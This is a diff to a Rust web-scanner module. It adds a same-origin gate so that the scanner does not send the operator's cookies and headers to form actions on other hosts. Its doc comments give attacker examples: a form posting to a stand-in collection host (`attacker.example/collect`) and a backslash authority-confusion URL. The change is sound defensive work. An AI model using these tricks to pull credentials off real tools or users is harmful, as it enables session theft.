@@ -77,39 +77,47 @@ pub fn compose_cookie_header_excluding(
     if s.is_empty() { None } else { Some(s) }
 }
 
-/// Case-insensitive check if a header exists in a (name, value) vector.
-#[inline]
-pub fn has_header(headers: &[(String, String)], name: &str) -> bool {
-    headers.iter().any(|(k, _)| k.eq_ignore_ascii_case(name))
-}
-
-/// Apply provided headers (verbatim), then append `target.user_agent` as a
-/// User-Agent header when non-empty. reqwest appends rather than overrides, so a
-/// caller that also placed a User-Agent in `target.headers` ends up sending both.
-/// If `cookie_header` is Some, attach it. Otherwise, if no Cookie header exists in headers,
-/// Same-origin check: scheme, host and port must all match, compared on the
-/// *parsed* URLs so authority-confusing spellings (`http://a\\@b/`, userinfo,
-/// IDN) are already resolved before the comparison.
+/// Same-origin check: scheme, host and port must all match.
+///
+/// Compared on the *parsed* URLs, so authority-confusing spellings
+/// (`http://a\@b/`, userinfo, IDN) are already resolved by WHATWG parsing
+/// before the comparison — a textual prefix check against the target URL would
+/// not survive them. `Url::origin` is what does the comparing: it is exactly
+/// `(scheme, host, port_or_known_default)` for http(s), and yields a unique
+/// opaque origin for schemes with no authority, so two host-less URLs never
+/// compare equal to each other the way a hand-rolled `host_str()` check would.
 pub(crate) fn is_same_origin(a: &Url, b: &Url) -> bool {
-    a.scheme() == b.scheme()
-        && a.host_str() == b.host_str()
-        && a.port_or_known_default() == b.port_or_known_default()
+    a.origin() == b.origin()
 }
 
 /// Whether sending the operator's credentials from `page` to `dest` keeps them
 /// on the origin they were meant for.
 ///
-/// This is [`is_same_origin`] plus the one relaxation that is both ubiquitous
-/// and safe: a `http://host/` -> `https://host/` upgrade on default ports. The
-/// classic "page served over HTTP, form posts over TLS" shape trips a strict
-/// origin check even though the destination is the same host and strictly more
-/// protected, and treating it as foreign silently drops every parameter on such
-/// a form.
+/// This is [`is_same_origin`] plus one relaxation: a `http://host/` ->
+/// `https://host/` upgrade on the default ports. The classic "page served over
+/// HTTP, form posts over TLS" shape trips a strict origin check even though the
+/// destination is the same host and strictly better protected, and treating it
+/// as foreign silently drops every parameter on such a form.
 ///
-/// The relaxation is deliberately narrow. The reverse direction
-/// (`https` -> `http`) stays refused, so credentials can never be walked onto
-/// plaintext, and the host must be identical — a hop to a different port of the
-/// same host is a different service and stays refused too.
+/// 80 -> 443 is of course itself a port change; it is allowed because that pair
+/// *is* the same logical origin by convention, which is not true of ports in
+/// general. So the relaxation is pinned to exactly those two: any other port on
+/// either side stays refused, because a different port on the same host is a
+/// different service with its own auth realm. The reverse direction
+/// (`https` -> `http`) stays refused too, so credentials can never be walked
+/// onto plaintext.
+///
+/// Residual risk, accepted: a host that serves an unrelated application on 443
+/// receives credentials that were configured for the :80 service. A browser
+/// already sends its (non-`Secure`) cookie jar to both, and the alternative is
+/// losing the most common authenticated-form shape on the web.
+///
+/// One predicate governs both the form-action gates and the `--follow-redirects`
+/// policy on purpose: they are the same question (may the operator's
+/// credentials go here?) and this codebase's parallel-implementation history is
+/// that two copies drift. Widening it therefore widens a security control as
+/// well as a recall gate — `target_parser::tests` pins the redirect side
+/// independently so that cannot happen unnoticed.
 pub(crate) fn same_origin_or_tls_upgrade(page: &Url, dest: &Url) -> bool {
     if is_same_origin(page, dest) {
         return true;
@@ -121,6 +129,61 @@ pub(crate) fn same_origin_or_tls_upgrade(page: &Url, dest: &Url) -> bool {
         && dest.port_or_known_default() == Some(443)
 }
 
+/// Resolve a `<form action>` against the page it was found on, returning the URL
+/// to probe -- or `None` when the form must be skipped.
+///
+/// The action attribute is attacker-controlled content: it comes from the
+/// scanned page, not from the operator. Probing a destination the scan may not
+/// send credentials to hands over every credential configured for the run --
+/// `-H` headers, `--cookies`, and any `Authorization`/`Cookie` inherited from a
+/// raw-http or HAR import, all attached unconditionally by
+/// [`apply_headers_ua_cookies`] -- to a host the operator never named. A page
+/// serving `<form action="https://attacker.example/collect">` is enough to
+/// collect the operator's session, and the leak does not stop at the probes: if
+/// that endpoint echoes the probe marker back, the fields are recorded as
+/// discovered parameters and the whole scanning phase then aims there.
+///
+/// [`same_origin_or_tls_upgrade`] is what decides, and it compares *parsed*
+/// origins, which is what makes this hold against authority-confusing actions
+/// such as `http://attacker.example\@target.example/submit`: `join` has already
+/// resolved that to host `attacker.example` (correct WHATWG parsing -- a
+/// backslash terminates the authority in a special scheme), so it compares as
+/// foreign. A textual prefix check against the page URL would not.
+///
+/// The cost is accepted: parameters on a form that legitimately posts to a
+/// different host (a separate API or login host) are not discovered.
+///
+/// Both form-parsing paths -- `parameter_analysis::discovery::form` and the
+/// blind/stored path in `scanning::xss_blind` -- go through here, because they
+/// had independently grown the same resolve-then-gate block and this codebase's
+/// history is that such pairs drift.
+pub(crate) fn resolve_probeable_form_action(page: &Url, action_attr: &str) -> Option<Url> {
+    let resolved = if action_attr.is_empty() || action_attr == "#" {
+        page.clone()
+    } else {
+        page.join(action_attr).ok()?
+    };
+    if !same_origin_or_tls_upgrade(page, &resolved) {
+        crate::dbg_log!(
+            "skipping form action {} on {} (credentials are not sent off-origin)",
+            resolved,
+            page
+        );
+        return None;
+    }
+    Some(resolved)
+}
+
+/// Case-insensitive check if a header exists in a (name, value) vector.
+#[inline]
+pub fn has_header(headers: &[(String, String)], name: &str) -> bool {
+    headers.iter().any(|(k, _)| k.eq_ignore_ascii_case(name))
+}
+
+/// Apply provided headers (verbatim), then append `target.user_agent` as a
+/// User-Agent header when non-empty. reqwest appends rather than overrides, so a
+/// caller that also placed a User-Agent in `target.headers` ends up sending both.
+/// If `cookie_header` is Some, attach it. Otherwise, if no Cookie header exists in headers,
 /// auto-attach from target.cookies (when non-empty).
 pub(crate) fn apply_headers_ua_cookies(
     rb: RequestBuilder,
